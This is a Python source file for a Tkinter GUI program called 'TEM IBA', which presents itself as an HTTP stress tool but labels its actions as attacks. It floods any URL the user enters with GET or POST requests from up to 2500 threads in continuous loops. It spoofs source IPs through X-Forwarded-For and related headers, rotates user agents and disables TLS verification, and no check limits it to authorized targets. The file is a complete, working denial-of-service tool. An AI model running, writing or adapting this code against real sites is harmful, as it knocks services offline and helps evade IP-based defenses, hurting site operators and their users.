#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TEM IBA - Ultimate HTTP Stress Tool with GUI
Version: 5.0
Author: TEM IBA Team
"""

import threading
import time
import urllib.parse
import random
import http.client
import ssl
import tkinter as tk
from tkinter import ttk, messagebox
from concurrent.futures import ThreadPoolExecutor

# Constants
MAX_THREADS = 2500
REQUEST_TIMEOUT = 15

COUNTRIES = {
    'US': ['72.', '104.', '198.'],
    'UK': ['5.', '31.', '95.'],
    'DE': ['78.', '79.', '85.'],
    'FR': ['90.', '91.', '92.'],
    'JP': ['126.', '133.', '210.'],
    'RU': ['46.', '79.', '94.'],
    'CN': ['36.', '42.', '61.'],
    'BR': ['177.', '179.', '189.'],
    'IN': ['106.', '115.', '223.'],
    'SG': ['128.', '175.', '203.']
}

class TEM_IBA:
    def __init__(self, url, threads, method, log_callback):
        self.url = url
        self.threads = threads
        self.method = method
        self.is_attacking = False
        self.log_callback = log_callback

    def generate_random_ip(self):
        country = random.choice(list(COUNTRIES.keys()))
        base = random.choice(COUNTRIES[country])
        return f"{base}{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

    def get_random_user_agent(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]
        return random.choice(agents)

    def send_request(self, ip):
        try:
            parsed_url = urllib.parse.urlparse(self.url)
            host = parsed_url.netloc
            path = parsed_url.path or '/'
            ssl_ = parsed_url.scheme == 'https'

            headers = {
                'User-Agent': self.get_random_user_agent(),
                'X-Forwarded-For': ip,
                'X-Real-IP': ip,
                'Client-IP': ip
            }

            if ssl_:
                context = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(host, timeout=REQUEST_TIMEOUT, context=context)
            else:
                conn = http.client.HTTPConnection(host, timeout=REQUEST_TIMEOUT)

            conn.request(self.method, path, headers=headers)
            conn.getresponse()
            conn.close()
            self.log_callback(f"[{ip}] SUCCESS")
        except Exception:
            self.log_callback(f"[{ip}] FAILED")

    def attack_thread(self):
        while self.is_attacking:
            ip = self.generate_random_ip()
            self.send_request(ip)

    def start_attack(self):
        self.is_attacking = True
        self.log_callback(f"Started attacking {self.url} with {self.threads} threads using {self.method} method.")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.attack_thread)

    def stop_attack(self):
        self.is_attacking = False
        self.log_callback("Attack stopped.")

# GUI
class TEM_IBAGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("TEM IBA - Ultimate HTTP Stress Tool v5.0")

        self.url_entry = ttk.Entry(root, width=50)
        self.url_entry.insert(0, "http://")
        self.url_entry.pack(pady=5)

        self.threads_spinbox = ttk.Spinbox(root, from_=1, to=MAX_THREADS)
        self.threads_spinbox.set(250)
        self.threads_spinbox.pack(pady=5)

        self.method_combo = ttk.Combobox(root, values=["GET", "POST"])
        self.method_combo.set("GET")
        self.method_combo.pack(pady=5)

        self.start_button = ttk.Button(root, text="Start Attack", command=self.start_attack)
        self.start_button.pack(pady=5)

        self.stop_button = ttk.Button(root, text="Stop Attack", command=self.stop_attack, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        self.log_text = tk.Text(root, height=15, width=80)
        self.log_text.pack(pady=10)

        self.tool = None
        self.attack_thread = None

    def log(self, message):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)

    def start_attack(self):
        url = self.url_entry.get().strip()
        threads = int(self.threads_spinbox.get())
        method = self.method_combo.get()

        if not url:
            messagebox.showerror("Error", "Please enter a target URL.")
            return

        self.tool = TEM_IBA(url, threads, method, self.log)
        self.attack_thread = threading.Thread(target=self.tool.start_attack)
        self.attack_thread.start()

        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_attack(self):
        if self.tool:
            self.tool.stop_attack()

        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

if __name__ == "__main__":
    root = tk.Tk()
    app = TEM_IBAGUI(root)
    root.mainloop()
